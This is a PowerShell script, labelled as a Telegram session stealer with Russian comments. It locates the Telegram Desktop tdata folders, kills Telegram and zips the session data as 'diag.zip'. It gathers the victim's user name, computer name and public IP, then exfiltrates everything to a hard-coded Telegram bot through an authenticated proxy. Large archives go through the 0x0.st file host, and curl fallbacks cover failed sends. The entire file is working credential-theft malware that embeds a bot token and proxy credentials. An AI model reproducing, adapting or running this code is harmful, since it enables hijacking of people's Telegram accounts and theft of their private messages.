# ============================================================
# Telegram Session Stealer + 0x0.st + Proxy (400 fix final)
# ============================================================

$botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
$chatId   = "8620709143"

# Прокси
$proxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
$proxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")

# Функция отправки в Telegram (с UploadData)
function Send-TelegramMessage {
    param($text)
    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json -Compress

    $wc = New-Object System.Net.WebClient
    $wc.Proxy = $proxy
    $wc.Encoding = [System.Text.Encoding]::UTF8
    $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")

    try {
        $data = [System.Text.Encoding]::UTF8.GetBytes($body)
        $wc.UploadData($url, "POST", $data) | Out-Null
        return $true
    } catch [System.Net.WebException] {
        $stream = $_.Exception.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $serverError = $reader.ReadToEnd()
        Write-Host "❌ Ошибка Telegram API: $serverError" -ForegroundColor Red
        # Fallback через curl (на случай, если UploadData не сработает)
        $tempFile = [System.IO.Path]::GetTempFileName()
        $body | Out-File -FilePath $tempFile -Encoding UTF8
        $proxyUrl = "http://gate.proxydata.ru:3129"
        $proxyAuth = "user-xpx93ax5:5pxp942ldb7jtnh2"
        $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -H 'Content-Type: application/json' -X POST -d @$tempFile $url 2>nul"
        Invoke-Expression $cmd
        Remove-Item $tempFile -Force
        return $true
    } catch {
        Write-Host "❌ Другая ошибка: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    } finally {
        $wc.Dispose()
    }
}

# Функция загрузки на 0x0.st (с fallback)
function Upload-To0x0 {
    param($filePath)
    $wc = New-Object System.Net.WebClient
    $wc.Proxy = $proxy
    try {
        $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
        return [System.Text.Encoding]::UTF8.GetString($response).Trim()
    } catch [System.Net.WebException] {
        $stream = $_.Exception.Response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $serverError = $reader.ReadToEnd()
        Write-Host "❌ Ошибка 0x0.st: $serverError" -ForegroundColor Red
        # fallback через curl
        $proxyUrl = "http://gate.proxydata.ru:3129"
        $proxyAuth = "user-xpx93ax5:5pxp942ldb7jtnh2"
        $tempOutput = [System.IO.Path]::GetTempFileName()
        $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -F 'file=@$filePath' https://0x0.st -o $tempOutput 2>nul"
        Invoke-Expression $cmd
        $link = Get-Content $tempOutput -Raw
        Remove-Item $tempOutput -Force
        return $link.Trim()
    } finally {
        $wc.Dispose()
    }
}

try {
    # 1. Поиск tdata
    $paths = @()
    @("$env:APPDATA\Telegram Desktop\tdata", "$env:APPDATA\Telegram Desktop Beta\tdata") | ForEach-Object {
        if (Test-Path $_) { $paths += $_ }
    }
    if ($paths.Count -eq 0) {
        Send-TelegramMessage "❌ tdata not found"
        exit
    }

    # 2. Завершаем Telegram
    Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force

    # 3. Архивация
    $zip = "$env:TEMP\diag.zip"
    Compress-Archive -Path $paths -DestinationPath $zip -Force

    # 4. Сбор информации
    $user = $env:USERNAME
    $comp = $env:COMPUTERNAME
    $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -Proxy $proxy).Content.Trim()
    $caption = "$user@$comp | IP: $ip"
    $size = (Get-Item $zip).Length

    # 5. Отправка
    if ($size -gt 52428800) {
        $link = Upload-To0x0 -filePath $zip
        Send-TelegramMessage "$caption`nDownload: $link"
    } else {
        # Маленький файл – multipart/form-data
        $bytes = [System.IO.File]::ReadAllBytes($zip)
        $boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
        $multipart = @()
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="chat_id"'
        $multipart += ""
        $multipart += $chatId
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="document"; filename="diag.zip"'
        $multipart += 'Content-Type: application/zip'
        $multipart += ""
        $multipart += [System.Text.Encoding]::ASCII.GetString($bytes)
        $multipart += "--$boundary--"
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"

        $wc = New-Object System.Net.WebClient
        $wc.Proxy = $proxy
        $wc.Encoding = [System.Text.Encoding]::UTF8
        foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }

        try {
            $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
            $wc.UploadData($url, "POST", $data) | Out-Null
        } catch [System.Net.WebException] {
            $stream = $_.Exception.Response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $serverError = $reader.ReadToEnd()
            Write-Host "❌ Ошибка отправки файла: $serverError" -ForegroundColor Red
            # fallback через curl
            $tempData = [System.IO.Path]::GetTempFileName()
            ($multipart -join "`r`n") | Out-File -FilePath $tempData -Encoding ASCII
            $proxyUrl = "http://gate.proxydata.ru:3129"
            $proxyAuth = "user-xpx93ax5:5pxp942ldb7jtnh2"
            $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -X POST -H 'Content-Type: multipart/form-data; boundary=$boundary' --data-binary @$tempData $url 2>nul"
            Invoke-Expression $cmd
            Remove-Item $tempData -Force
        } finally {
            $wc.Dispose()
        }
    }

    Remove-Item $zip -Force -ErrorAction SilentlyContinue
    Send-TelegramMessage "✅ Done"

} catch {
    Send-TelegramMessage "❌ Error: $($_.Exception.Message)"
}
